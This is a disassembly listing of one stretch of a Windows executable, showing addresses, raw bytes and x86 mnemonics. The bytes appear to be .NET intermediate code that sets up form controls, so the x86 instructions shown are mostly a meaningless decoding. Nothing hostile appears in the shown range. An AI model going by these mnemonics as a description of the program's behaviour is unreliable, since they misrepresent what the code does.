  403071:	00 00                	add    %al,(%eax)
  403073:	0a 6f 91             	or     -0x6f(%edi),%ch
  403076:	00 00                	add    %al,(%eax)
  403078:	0a 02                	or     (%edx),%al
  40307a:	7b 2c                	jnp    0x4030a8
  40307c:	00 00                	add    %al,(%eax)
  40307e:	04 72                	add    $0x72,%al
  403080:	64 04 00             	fs add $0x0,%al
  403083:	70 6f                	jo     0x4030f4
  403085:	92                   	xchg   %eax,%edx
  403086:	00 00                	add    %al,(%eax)
  403088:	0a 02                	or     (%edx),%al
  40308a:	7b 2c                	jnp    0x4030b8
  40308c:	00 00                	add    %al,(%eax)
  40308e:	04 17                	add    $0x17,%al
  403090:	6f                   	outsl  %ds:(%esi),(%dx)
  403091:	93                   	xchg   %eax,%ebx
  403092:	00 00                	add    %al,(%eax)
  403094:	0a 02                	or     (%edx),%al
  403096:	7b 2c                	jnp    0x4030c4
  403098:	00 00                	add    %al,(%eax)
  40309a:	04 16                	add    $0x16,%al
  40309c:	6f                   	outsl  %ds:(%esi),(%dx)
  40309d:	94                   	xchg   %eax,%esp
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	0a 02                	or     (%edx),%al
  4030a2:	7b 2c                	jnp    0x4030d0
  4030a4:	00 00                	add    %al,(%eax)
  4030a6:	04 20                	add    $0x20,%al
  4030a8:	d6                   	salc
  4030a9:	01 00                	add    %eax,(%eax)
  4030ab:	00 20                	add    %ah,(%eax)
  4030ad:	b3 01                	mov    $0x1,%bl
  4030af:	00 00                	add    %al,(%eax)
  4030b1:	73 90                	jae    0x403043
  4030b3:	00 00                	add    %al,(%eax)
  4030b5:	0a 6f 95             	or     -0x6b(%edi),%ch
  4030b8:	00 00                	add    %al,(%eax)
  4030ba:	0a 02                	or     (%edx),%al
  4030bc:	7b 2c                	jnp    0x4030ea
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	04 1c                	add    $0x1c,%al
  4030c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4030c3:	96                   	xchg   %eax,%esi
  4030c4:	00 00                	add    %al,(%eax)
  4030c6:	0a 02                	or     (%edx),%al
  4030c8:	7b 2c                	jnp    0x4030f6
  4030ca:	00 00                	add    %al,(%eax)
  4030cc:	04 16                	add    $0x16,%al
  4030ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4030cf:	79 00                	jns    0x4030d1
  4030d1:	00 0a                	add    %cl,(%edx)
  4030d3:	02 7b 2c             	add    0x2c(%ebx),%bh
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	04 16                	add    $0x16,%al
  4030da:	6f                   	outsl  %ds:(%esi),(%dx)
  4030db:	97                   	xchg   %eax,%edi
  4030dc:	00 00                	add    %al,(%eax)
  4030de:	0a 02                	or     (%edx),%al
  4030e0:	7b 2c                	jnp    0x40310e
  4030e2:	00 00                	add    %al,(%eax)
  4030e4:	04 02                	add    $0x2,%al
  4030e6:	fe 06                	incb   (%esi)
  4030e8:	24 00                	and    $0x0,%al
  4030ea:	00 06                	add    %al,(%esi)
  4030ec:	73 98                	jae    0x403086
  4030ee:	00 00                	add    %al,(%eax)
  4030f0:	0a 6f 99             	or     -0x67(%edi),%ch
  4030f3:	00 00                	add    %al,(%eax)
  4030f5:	0a 02                	or     (%edx),%al
  4030f7:	7b 2c                	jnp    0x403125
  4030f9:	00 00                	add    %al,(%eax)
  4030fb:	04 02                	add    $0x2,%al
  4030fd:	fe 06                	incb   (%esi)
  4030ff:	2e 00 00             	add    %al,%cs:(%eax)
  403102:	06                   	push   %es
  403103:	73 9a                	jae    0x40309f
  403105:	00 00                	add    %al,(%eax)
  403107:	0a 6f 9b             	or     -0x65(%edi),%ch
  40310a:	00 00                	add    %al,(%eax)
  40310c:	0a 02                	or     (%edx),%al
  40310e:	7b 2d                	jnp    0x40313d
  403110:	00 00                	add    %al,(%eax)
  403112:	04 1f                	add    $0x1f,%al
  403114:	0f 6f 8c 00 00 0a 02 	movq   0x7b020a00(%eax,%eax,1),%mm1
  40311b:	7b 
  40311c:	2d 00 00 04 28       	sub    $0x28040000,%eax
  403121:	9c                   	pushf
  403122:	00 00                	add    %al,(%eax)
  403124:	0a 6f 9d             	or     -0x63(%edi),%ch
  403127:	00 00                	add    %al,(%eax)
  403129:	0a 02                	or     (%edx),%al
  40312b:	7b 2d                	jnp    0x40315a
  40312d:	00 00                	add    %al,(%eax)
  40312f:	04 16                	add    $0x16,%al
  403131:	6f                   	outsl  %ds:(%esi),(%dx)
  403132:	9e                   	sahf
  403133:	00 00                	add    %al,(%eax)
  403135:	0a 02                	or     (%edx),%al
  403137:	7b 2d                	jnp    0x403166
  403139:	00 00                	add    %al,(%eax)
  40313b:	04 28                	add    $0x28,%al
  40313d:	50                   	push   %eax
  40313e:	00 00                	add    %al,(%eax)
  403140:	06                   	push   %es
  403141:	6f                   	outsl  %ds:(%esi),(%dx)
  403142:	9f                   	lahf
  403143:	00 00                	add    %al,(%eax)
  403145:	0a 02                	or     (%edx),%al
  403147:	7b 2d                	jnp    0x403176
  403149:	00 00                	add    %al,(%eax)
  40314b:	04 20                	add    $0x20,%al
  40314d:	b9 00 00 00 20       	mov    $0x20000000,%ecx
  403152:	ce                   	into
  403153:	00 00                	add    %al,(%eax)
  403155:	00 73 8e             	add    %dh,-0x72(%ebx)
  403158:	00 00                	add    %al,(%eax)
  40315a:	0a 6f 8f             	or     -0x71(%edi),%ch
  40315d:	00 00                	add    %al,(%eax)
  40315f:	0a 02                	or     (%edx),%al
  403161:	7b 2d                	jnp    0x403190
  403163:	00 00                	add    %al,(%eax)
  403165:	04 72                	add    $0x72,%al
  403167:	7a 04                	jp     0x40316d
  403169:	00 70 6f             	add    %dh,0x6f(%eax)
  40316c:	92                   	xchg   %eax,%edx
  40316d:	00 00                	add    %al,(%eax)
  40316f:	0a 02                	or     (%edx),%al
  403171:	7b 2d                	jnp    0x4031a0
  403173:	00 00                	add    %al,(%eax)
  403175:	04 1f                	add    $0x1f,%al
  403177:	64 1f                	fs pop %ds
  403179:	21 73 90             	and    %esi,-0x70(%ebx)
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 6f 95             	or     -0x6b(%edi),%ch
  403181:	00 00                	add    %al,(%eax)
  403183:	0a 02                	or     (%edx),%al
  403185:	7b 2d                	jnp    0x4031b4
  403187:	00 00                	add    %al,(%eax)
  403189:	04 1a                	add    $0x1a,%al
  40318b:	6f                   	outsl  %ds:(%esi),(%dx)
  40318c:	a0 00 00 0a 02       	mov    0x20a0000,%al
  403191:	7b 2d                	jnp    0x4031c0
  403193:	00 00                	add    %al,(%eax)
  403195:	04 1d                	add    $0x1d,%al
  403197:	6f                   	outsl  %ds:(%esi),(%dx)
  403198:	a1 00 00 0a 02       	mov    0x20a0000,%eax
  40319d:	7b 2d                	jnp    0x4031cc
  40319f:	00 00                	add    %al,(%eax)
  4031a1:	04 16                	add    $0x16,%al
  4031a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4031a4:	a2 00 00 0a 02       	mov    %al,0x20a0000
  4031a9:	7b 2e                	jnp    0x4031d9
  4031ab:	00 00                	add    %al,(%eax)
  4031ad:	04 1f                	add    $0x1f,%al
  4031af:	0d 6f 8c 00 00       	or     $0x8c6f,%eax
  4031b4:	0a 02                	or     (%edx),%al
  4031b6:	7b 2e                	jnp    0x4031e6
  4031b8:	00 00                	add    %al,(%eax)
  4031ba:	04 28                	add    $0x28,%al
  4031bc:	9c                   	pushf
  4031bd:	00 00                	add    %al,(%eax)
  4031bf:	0a 6f 9d             	or     -0x63(%edi),%ch
  4031c2:	00 00                	add    %al,(%eax)
  4031c4:	0a 02                	or     (%edx),%al
  4031c6:	7b 2e                	jnp    0x4031f6
  4031c8:	00 00                	add    %al,(%eax)
  4031ca:	04 72                	add    $0x72,%al
  4031cc:	9e                   	sahf
  4031cd:	04 00                	add    $0x0,%al
  4031cf:	70 22                	jo     0x4031f3
  4031d1:	00 00                	add    %al,(%eax)
  4031d3:	34 41                	xor    $0x41,%al
  4031d5:	17                   	pop    %ss
  4031d6:	19 16                	sbb    %edx,(%esi)
  4031d8:	73 a3                	jae    0x40317d
  4031da:	00 00                	add    %al,(%eax)
  4031dc:	0a 6f a4             	or     -0x5c(%edi),%ch
  4031df:	00 00                	add    %al,(%eax)
  4031e1:	0a 02                	or     (%edx),%al
  4031e3:	7b 2e                	jnp    0x403213
  4031e5:	00 00                	add    %al,(%eax)
  4031e7:	04 28                	add    $0x28,%al
  4031e9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4031ea:	00 00                	add    %al,(%eax)
  4031ec:	0a 6f a6             	or     -0x5a(%edi),%ch
  4031ef:	00 00                	add    %al,(%eax)
  4031f1:	0a 02                	or     (%edx),%al
  4031f3:	7b 2e                	jnp    0x403223
  4031f5:	00 00                	add    %al,(%eax)
  4031f7:	04 1f                	add    $0x1f,%al
  4031f9:	2f                   	das
  4031fa:	20 b7 00 00 00 73    	and    %dh,0x73000000(%edi)
  403200:	8e 00                	mov    (%eax),%es
  403202:	00 0a                	add    %cl,(%edx)
  403204:	6f                   	outsl  %ds:(%esi),(%dx)
  403205:	8f 00                	pop    (%eax)
  403207:	00 0a                	add    %cl,(%edx)
  403209:	02 7b 2e             	add    0x2e(%ebx),%bh
  40320c:	00 00                	add    %al,(%eax)
  40320e:	04 72                	add    $0x72,%al
  403210:	ae                   	scas   %es:(%edi),%al
  403211:	04 00                	add    $0x0,%al
  403213:	70 6f                	jo     0x403284
  403215:	92                   	xchg   %eax,%edx
  403216:	00 00                	add    %al,(%eax)
  403218:	0a 02                	or     (%edx),%al
  40321a:	7b 2e                	jnp    0x40324a
  40321c:	00 00                	add    %al,(%eax)
  40321e:	04 1f                	add    $0x1f,%al
  403220:	28 16                	sub    %dl,(%esi)
  403222:	1f                   	pop    %ds
  403223:	28 16                	sub    %dl,(%esi)
  403225:	73 a7                	jae    0x4031ce
  403227:	00 00                	add    %al,(%eax)
  403229:	0a 6f a8             	or     -0x58(%edi),%ch
  40322c:	00 00                	add    %al,(%eax)
  40322e:	0a 02                	or     (%edx),%al
  403230:	7b 2e                	jnp    0x403260
  403232:	00 00                	add    %al,(%eax)
  403234:	04 20                	add    $0x20,%al
  403236:	78 01                	js     0x403239
  403238:	00 00                	add    %al,(%eax)
  40323a:	1f                   	pop    %ds
  40323b:	39 73 90             	cmp    %esi,-0x70(%ebx)
  40323e:	00 00                	add    %al,(%eax)
  403240:	0a 6f 95             	or     -0x6b(%edi),%ch
  403243:	00 00                	add    %al,(%eax)
  403245:	0a 02                	or     (%edx),%al
  403247:	7b 2e                	jnp    0x403277
  403249:	00 00                	add    %al,(%eax)
  40324b:	04 1b                	add    $0x1b,%al
  40324d:	6f                   	outsl  %ds:(%esi),(%dx)
  40324e:	96                   	xchg   %eax,%esi
  40324f:	00 00                	add    %al,(%eax)
  403251:	0a 02                	or     (%edx),%al
  403253:	7b 2e                	jnp    0x403283
  403255:	00 00                	add    %al,(%eax)
  403257:	04 72                	add    $0x72,%al
  403259:	c4 04 00             	les    (%eax,%eax,1),%eax
  40325c:	70 6f                	jo     0x4032cd
  40325e:	52                   	push   %edx
  40325f:	00 00                	add    %al,(%eax)
  403261:	0a 02                	or     (%edx),%al
  403263:	7b 2e                	jnp    0x403293
  403265:	00 00                	add    %al,(%eax)
  403267:	04 1f                	add    $0x1f,%al
  403269:	20 6f a9             	and    %ch,-0x57(%edi)
  40326c:	00 00                	add    %al,(%eax)
  40326e:	0a 02                	or     (%edx),%al
  403270:	7b 2e                	jnp    0x4032a0
  403272:	00 00                	add    %al,(%eax)
  403274:	04 16                	add    $0x16,%al
  403276:	6f                   	outsl  %ds:(%esi),(%dx)
  403277:	aa                   	stos   %al,%es:(%edi)
  403278:	00 00                	add    %al,(%eax)
  40327a:	0a 02                	or     (%edx),%al
  40327c:	7b 2e                	jnp    0x4032ac
  40327e:	00 00                	add    %al,(%eax)
  403280:	04 16                	add    $0x16,%al
  403282:	6f                   	outsl  %ds:(%esi),(%dx)
  403283:	79 00                	jns    0x403285
  403285:	00 0a                	add    %cl,(%edx)
  403287:	02 7b 31             	add    0x31(%ebx),%bh
  40328a:	00 00                	add    %al,(%eax)
  40328c:	04 1f                	add    $0x1f,%al
  40328e:	0d 6f 8c 00 00       	or     $0x8c6f,%eax
  403293:	0a 02                	or     (%edx),%al
  403295:	7b 31                	jnp    0x4032c8
  403297:	00 00                	add    %al,(%eax)
  403299:	04 28                	add    $0x28,%al
  40329b:	9c                   	pushf
  40329c:	00 00                	add    %al,(%eax)
  40329e:	0a 6f 9d             	or     -0x63(%edi),%ch
  4032a1:	00 00                	add    %al,(%eax)
  4032a3:	0a 02                	or     (%edx),%al
  4032a5:	7b 31                	jnp    0x4032d8
  4032a7:	00 00                	add    %al,(%eax)
  4032a9:	04 16                	add    $0x16,%al
  4032ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ac:	9e                   	sahf
  4032ad:	00 00                	add    %al,(%eax)
  4032af:	0a 02                	or     (%edx),%al
  4032b1:	7b 31                	jnp    0x4032e4
  4032b3:	00 00                	add    %al,(%eax)
  4032b5:	04 28                	add    $0x28,%al
  4032b7:	4e                   	dec    %esi
  4032b8:	00 00                	add    %al,(%eax)
  4032ba:	06                   	push   %es
  4032bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4032bc:	9f                   	lahf
  4032bd:	00 00                	add    %al,(%eax)
  4032bf:	0a 02                	or     (%edx),%al
  4032c1:	7b 31                	jnp    0x4032f4
  4032c3:	00 00                	add    %al,(%eax)
  4032c5:	04 20                	add    $0x20,%al
  4032c7:	d2 00                	rolb   %cl,(%eax)
  4032c9:	00 00                	add    %al,(%eax)
  4032cb:	20 93 00 00 00 73    	and    %dl,0x73000000(%ebx)
  4032d1:	8e 00                	mov    (%eax),%es
  4032d3:	00 0a                	add    %cl,(%edx)
  4032d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d6:	8f 00                	pop    (%eax)
  4032d8:	00 0a                	add    %cl,(%edx)
  4032da:	02 7b 31             	add    0x31(%ebx),%bh
  4032dd:	00 00                	add    %al,(%eax)
  4032df:	04 72                	add    $0x72,%al
  4032e1:	59                   	pop    %ecx
  4032e2:	05 00 70 6f 92       	add    $0x926f7000,%eax
  4032e7:	00 00                	add    %al,(%eax)
  4032e9:	0a 02                	or     (%edx),%al
  4032eb:	7b 31                	jnp    0x40331e
  4032ed:	00 00                	add    %al,(%eax)
  4032ef:	04 1f                	add    $0x1f,%al
  4032f1:	32 1f                	xor    (%edi),%bl
  4032f3:	21 73 90             	and    %esi,-0x70(%ebx)
  4032f6:	00 00                	add    %al,(%eax)
  4032f8:	0a 6f 95             	or     -0x6b(%edi),%ch
  4032fb:	00 00                	add    %al,(%eax)
  4032fd:	0a 02                	or     (%edx),%al
  4032ff:	7b 31                	jnp    0x403332
  403301:	00 00                	add    %al,(%eax)
  403303:	04 1a                	add    $0x1a,%al
  403305:	6f                   	outsl  %ds:(%esi),(%dx)
  403306:	a0 00 00 0a 02       	mov    0x20a0000,%al
  40330b:	7b 31                	jnp    0x40333e
  40330d:	00 00                	add    %al,(%eax)
  40330f:	04 1a                	add    $0x1a,%al
  403311:	6f                   	outsl  %ds:(%esi),(%dx)
  403312:	a1 00 00 0a 02       	mov    0x20a0000,%eax
  403317:	7b 31                	jnp    0x40334a
  403319:	00 00                	add    %al,(%eax)
  40331b:	04 16                	add    $0x16,%al
  40331d:	6f                   	outsl  %ds:(%esi),(%dx)
  40331e:	a2 00 00 0a 02       	mov    %al,0x20a0000
  403323:	7b 31                	jnp    0x403356
  403325:	00 00                	add    %al,(%eax)
  403327:	04 16                	add    $0x16,%al
  403329:	6f                   	outsl  %ds:(%esi),(%dx)
  40332a:	79 00                	jns    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	02 7b 30             	add    0x30(%ebx),%bh
  403331:	00 00                	add    %al,(%eax)
  403333:	04 1f                	add    $0x1f,%al
  403335:	09 6f 8c             	or     %ebp,-0x74(%edi)
  403338:	00 00                	add    %al,(%eax)
  40333a:	0a 02                	or     (%edx),%al
  40333c:	7b 30                	jnp    0x40336e
  40333e:	00 00                	add    %al,(%eax)
  403340:	04 28                	add    $0x28,%al
  403342:	9c                   	pushf
  403343:	00 00                	add    %al,(%eax)
  403345:	0a 6f 9d             	or     -0x63(%edi),%ch
  403348:	00 00                	add    %al,(%eax)
  40334a:	0a 02                	or     (%edx),%al
  40334c:	7b 30                	jnp    0x40337e
  40334e:	00 00                	add    %al,(%eax)
  403350:	04 16                	add    $0x16,%al
  403352:	6f                   	outsl  %ds:(%esi),(%dx)
  403353:	ab                   	stos   %eax,%es:(%edi)
  403354:	00 00                	add    %al,(%eax)
  403356:	0a 02                	or     (%edx),%al
  403358:	7b 30                	jnp    0x40338a
  40335a:	00 00                	add    %al,(%eax)
  40335c:	04 72                	add    $0x72,%al
  40335e:	9e                   	sahf
  40335f:	04 00                	add    $0x0,%al
  403361:	70 22                	jo     0x403385
  403363:	00 00                	add    %al,(%eax)
  403365:	10 41 16             	adc    %al,0x16(%ecx)
  403368:	19 16                	sbb    %edx,(%esi)
  40336a:	73 a3                	jae    0x40330f
  40336c:	00 00                	add    %al,(%eax)
  40336e:	0a 6f a4             	or     -0x5c(%edi),%ch
  403371:	00 00                	add    %al,(%eax)
  403373:	0a 02                	or     (%edx),%al
  403375:	7b 30                	jnp    0x4033a7
  403377:	00 00                	add    %al,(%eax)
  403379:	04 28                	add    $0x28,%al
  40337b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40337c:	00 00                	add    %al,(%eax)
  40337e:	0a 6f a6             	or     -0x5a(%edi),%ch
  403381:	00 00                	add    %al,(%eax)
  403383:	0a 02                	or     (%edx),%al
  403385:	7b 30                	jnp    0x4033b7
  403387:	00 00                	add    %al,(%eax)
  403389:	04 20                	add    $0x20,%al
  40338b:	ee                   	out    %al,(%dx)
  40338c:	00 00                	add    %al,(%eax)
  40338e:	00 20                	add    %ah,(%eax)
  403390:	f7 00 00 00 73 8e    	testl  $0x8e730000,(%eax)
  403396:	00 00                	add    %al,(%eax)
  403398:	0a 6f 8f             	or     -0x71(%edi),%ch
  40339b:	00 00                	add    %al,(%eax)
  40339d:	0a 02                	or     (%edx),%al
  40339f:	7b 30                	jnp    0x4033d1
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	04 72                	add    $0x72,%al
  4033a5:	79 05                	jns    0x4033ac
  4033a7:	00 70 6f             	add    %dh,0x6f(%eax)
  4033aa:	92                   	xchg   %eax,%edx
  4033ab:	00 00                	add    %al,(%eax)
  4033ad:	0a 02                	or     (%edx),%al
  4033af:	7b 30                	jnp    0x4033e1
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	04 20                	add    $0x20,%al
  4033b5:	96                   	xchg   %eax,%esi
  4033b6:	00 00                	add    %al,(%eax)
  4033b8:	00 1f                	add    %bl,(%edi)
  4033ba:	22 73 90             	and    -0x70(%ebx),%dh
  4033bd:	00 00                	add    %al,(%eax)
  4033bf:	0a 6f 95             	or     -0x6b(%edi),%ch
  4033c2:	00 00                	add    %al,(%eax)
  4033c4:	0a 02                	or     (%edx),%al
  4033c6:	7b 30                	jnp    0x4033f8
  4033c8:	00 00                	add    %al,(%eax)
  4033ca:	04 18                	add    $0x18,%al
  4033cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4033cd:	96                   	xchg   %eax,%esi
  4033ce:	00 00                	add    %al,(%eax)
  4033d0:	0a 02                	or     (%edx),%al
  4033d2:	7b 30                	jnp    0x403404
  4033d4:	00 00                	add    %al,(%eax)
  4033d6:	04 72                	add    $0x72,%al
  4033d8:	a3 05 00 70 6f       	mov    %eax,0x6f700005
  4033dd:	52                   	push   %edx
  4033de:	00 00                	add    %al,(%eax)
  4033e0:	0a 02                	or     (%edx),%al
  4033e2:	7b 30                	jnp    0x403414
  4033e4:	00 00                	add    %al,(%eax)
  4033e6:	04 16                	add    $0x16,%al
  4033e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4033e9:	ac                   	lods   %ds:(%esi),%al
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	0a 02                	or     (%edx),%al
  4033ee:	7b 30                	jnp    0x403420
  4033f0:	00 00                	add    %al,(%eax)
  4033f2:	04 16                	add    $0x16,%al
  4033f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4033f5:	ad                   	lods   %ds:(%esi),%eax
  4033f6:	00 00                	add    %al,(%eax)
  4033f8:	0a 02                	or     (%edx),%al
  4033fa:	7b 30                	jnp    0x40342c
  4033fc:	00 00                	add    %al,(%eax)
  4033fe:	04 16                	add    $0x16,%al
  403400:	6f                   	outsl  %ds:(%esi),(%dx)
  403401:	79 00                	jns    0x403403
  403403:	00 0a                	add    %cl,(%edx)
  403405:	02 7b 30             	add    0x30(%ebx),%bh
  403408:	00 00                	add    %al,(%eax)
  40340a:	04 02                	add    $0x2,%al
  40340c:	fe 06                	incb   (%esi)
  40340e:	2b 00                	sub    (%eax),%eax
  403410:	00 06                	add    %al,(%esi)
  403412:	73 ae                	jae    0x4033c2
  403414:	00 00                	add    %al,(%eax)
  403416:	0a 6f af             	or     -0x51(%edi),%ch
  403419:	00 00                	add    %al,(%eax)
  40341b:	0a 02                	or     (%edx),%al
  40341d:	7b 2f                	jnp    0x40344e
  40341f:	00 00                	add    %al,(%eax)
  403421:	04 28                	add    $0x28,%al
  403423:	9c                   	pushf
  403424:	00 00                	add    %al,(%eax)
  403426:	0a 6f 9d             	or     -0x63(%edi),%ch
  403429:	00 00                	add    %al,(%eax)
  40342b:	0a 02                	or     (%edx),%al
  40342d:	7b 2f                	jnp    0x40345e
  40342f:	00 00                	add    %al,(%eax)
  403431:	04 16                	add    $0x16,%al
  403433:	6f                   	outsl  %ds:(%esi),(%dx)
  403434:	ab                   	stos   %eax,%es:(%edi)
  403435:	00 00                	add    %al,(%eax)
  403437:	0a 02                	or     (%edx),%al
  403439:	7b 2f                	jnp    0x40346a
  40343b:	00 00                	add    %al,(%eax)
  40343d:	04 72                	add    $0x72,%al
  40343f:	9e                   	sahf
  403440:	04 00                	add    $0x0,%al
  403442:	70 22                	jo     0x403466
  403444:	00 00                	add    %al,(%eax)
  403446:	10 41 16             	adc    %al,0x16(%ecx)
  403449:	19 16                	sbb    %edx,(%esi)
  40344b:	73 a3                	jae    0x4033f0
  40344d:	00 00                	add    %al,(%eax)
  40344f:	0a 6f a4             	or     -0x5c(%edi),%ch
  403452:	00 00                	add    %al,(%eax)
  403454:	0a 02                	or     (%edx),%al
  403456:	7b 2f                	jnp    0x403487
  403458:	00 00                	add    %al,(%eax)
  40345a:	04 28                	add    $0x28,%al
  40345c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40345d:	00 00                	add    %al,(%eax)
  40345f:	0a 6f a6             	or     -0x5a(%edi),%ch
  403462:	00 00                	add    %al,(%eax)
  403464:	0a 02                	or     (%edx),%al
  403466:	7b 2f                	jnp    0x403497
  403468:	00 00                	add    %al,(%eax)
  40346a:	04 1f                	add    $0x1f,%al
  40346c:	52                   	push   %edx
  40346d:	20 f7                	and    %dh,%bh
  40346f:	00 00                	add    %al,(%eax)
  403471:	00 73 8e             	add    %dh,-0x72(%ebx)
  403474:	00 00                	add    %al,(%eax)
  403476:	0a 6f 8f             	or     -0x71(%edi),%ch
  403479:	00 00                	add    %al,(%eax)
  40347b:	0a 02                	or     (%edx),%al
  40347d:	7b 2f                	jnp    0x4034ae
  40347f:	00 00                	add    %al,(%eax)
  403481:	04 72                	add    $0x72,%al
  403483:	c3                   	ret
  403484:	05 00 70 6f 92       	add    $0x926f7000,%eax
  403489:	00 00                	add    %al,(%eax)
  40348b:	0a 02                	or     (%edx),%al
  40348d:	7b 2f                	jnp    0x4034be
  40348f:	00 00                	add    %al,(%eax)
  403491:	04 20                	add    $0x20,%al
  403493:	96                   	xchg   %eax,%esi
  403494:	00 00                	add    %al,(%eax)
  403496:	00 1f                	add    %bl,(%edi)
  403498:	22 73 90             	and    -0x70(%ebx),%dh
  40349b:	00 00                	add    %al,(%eax)
  40349d:	0a 6f 95             	or     -0x6b(%edi),%ch
  4034a0:	00 00                	add    %al,(%eax)
  4034a2:	0a 02                	or     (%edx),%al
  4034a4:	7b 2f                	jnp    0x4034d5
  4034a6:	00 00                	add    %al,(%eax)
  4034a8:	04 17                	add    $0x17,%al
  4034aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4034ab:	96                   	xchg   %eax,%esi
  4034ac:	00 00                	add    %al,(%eax)
  4034ae:	0a 02                	or     (%edx),%al
  4034b0:	7b 2f                	jnp    0x4034e1
  4034b2:	00 00                	add    %al,(%eax)
  4034b4:	04 72                	add    $0x72,%al
  4034b6:	db 05 00 70 6f 52    	fildl  0x526f7000
  4034bc:	00 00                	add    %al,(%eax)
  4034be:	0a 02                	or     (%edx),%al
  4034c0:	7b 2f                	jnp    0x4034f1
  4034c2:	00 00                	add    %al,(%eax)
  4034c4:	04 16                	add    $0x16,%al
  4034c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c7:	ac                   	lods   %ds:(%esi),%al
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	0a 02                	or     (%edx),%al
  4034cc:	7b 2f                	jnp    0x4034fd
  4034ce:	00 00                	add    %al,(%eax)
  4034d0:	04 16                	add    $0x16,%al
  4034d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4034d3:	ad                   	lods   %ds:(%esi),%eax
  4034d4:	00 00                	add    %al,(%eax)
  4034d6:	0a 02                	or     (%edx),%al
  4034d8:	7b 2f                	jnp    0x403509
  4034da:	00 00                	add    %al,(%eax)
  4034dc:	04 16                	add    $0x16,%al
  4034de:	6f                   	outsl  %ds:(%esi),(%dx)
  4034df:	79 00                	jns    0x4034e1
  4034e1:	00 0a                	add    %cl,(%edx)
  4034e3:	02 7b 2f             	add    0x2f(%ebx),%bh
  4034e6:	00 00                	add    %al,(%eax)
  4034e8:	04 02                	add    $0x2,%al
  4034ea:	fe 06                	incb   (%esi)
  4034ec:	2a 00                	sub    (%eax),%al
  4034ee:	00 06                	add    %al,(%esi)
  4034f0:	73 ae                	jae    0x4034a0
  4034f2:	00 00                	add    %al,(%eax)
  4034f4:	0a 6f af             	or     -0x51(%edi),%ch
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	0a 02                	or     (%edx),%al
  4034fb:	7b 32                	jnp    0x40352f
  4034fd:	00 00                	add    %al,(%eax)
  4034ff:	04 28                	add    $0x28,%al
  403501:	b0 00                	mov    $0x0,%al
  403503:	00 0a                	add    %cl,(%edx)
  403505:	6f                   	outsl  %ds:(%esi),(%dx)
  403506:	b1 00                	mov    $0x0,%cl
  403508:	00 0a                	add    %cl,(%edx)
  40350a:	02 7b 32             	add    0x32(%ebx),%bh
  40350d:	00 00                	add    %al,(%eax)
  40350f:	04 17                	add    $0x17,%al
  403511:	6f                   	outsl  %ds:(%esi),(%dx)
  403512:	b2 00                	mov    $0x0,%dl
  403514:	00 0a                	add    %cl,(%edx)
  403516:	02 7b 32             	add    0x32(%ebx),%bh
  403519:	00 00                	add    %al,(%eax)
  40351b:	04 28                	add    $0x28,%al
  40351d:	9c                   	pushf
  40351e:	00 00                	add    %al,(%eax)
  403520:	0a 6f 9d             	or     -0x63(%edi),%ch
  403523:	00 00                	add    %al,(%eax)
  403525:	0a 02                	or     (%edx),%al
  403527:	7b 32                	jnp    0x40355b
  403529:	00 00                	add    %al,(%eax)
  40352b:	04 28                	add    $0x28,%al
  40352d:	b0 00                	mov    $0x0,%al
  40352f:	00 0a                	add    %cl,(%edx)
  403531:	6f                   	outsl  %ds:(%esi),(%dx)
  403532:	b3 00                	mov    $0x0,%bl
  403534:	00 0a                	add    %cl,(%edx)
  403536:	02 7b 32             	add    0x32(%ebx),%bh
  403539:	00 00                	add    %al,(%eax)
  40353b:	04 72                	add    $0x72,%al
  40353d:	9e                   	sahf
  40353e:	04 00                	add    $0x0,%al
  403540:	70 22                	jo     0x403564
  403542:	00 00                	add    %al,(%eax)
  403544:	10 41 16             	adc    %al,0x16(%ecx)
  403547:	19 16                	sbb    %edx,(%esi)
  403549:	73 a3                	jae    0x4034ee
  40354b:	00 00                	add    %al,(%eax)
  40354d:	0a 6f a4             	or     -0x5c(%edi),%ch
  403550:	00 00                	add    %al,(%eax)
  403552:	0a 02                	or     (%edx),%al
  403554:	7b 32                	jnp    0x403588
  403556:	00 00                	add    %al,(%eax)
  403558:	04 28                	add    $0x28,%al
  40355a:	b0 00                	mov    $0x0,%al
  40355c:	00 0a                	add    %cl,(%edx)
  40355e:	6f                   	outsl  %ds:(%esi),(%dx)
  40355f:	b4 00                	mov    $0x0,%ah
  403561:	00 0a                	add    %cl,(%edx)
  403563:	02 7b 32             	add    0x32(%ebx),%bh
  403566:	00 00                	add    %al,(%eax)
  403568:	04 1f                	add    $0x1f,%al
  40356a:	4f                   	dec    %edi
  40356b:	20 25 01 00 00 73    	and    %ah,0x73000001
  403571:	8e 00                	mov    (%eax),%es
  403573:	00 0a                	add    %cl,(%edx)
  403575:	6f                   	outsl  %ds:(%esi),(%dx)
  403576:	8f 00                	pop    (%eax)
  403578:	00 0a                	add    %cl,(%edx)
  40357a:	02 7b 32             	add    0x32(%ebx),%bh
  40357d:	00 00                	add    %al,(%eax)
  40357f:	04 72                	add    $0x72,%al
  403581:	e7 05                	out    %eax,$0x5
  403583:	00 70 6f             	add    %dh,0x6f(%eax)
  403586:	92                   	xchg   %eax,%edx
  403587:	00 00                	add    %al,(%eax)
  403589:	0a 02                	or     (%edx),%al
  40358b:	7b 32                	jnp    0x4035bf
  40358d:	00 00                	add    %al,(%eax)
  40358f:	04 1f                	add    $0x1f,%al
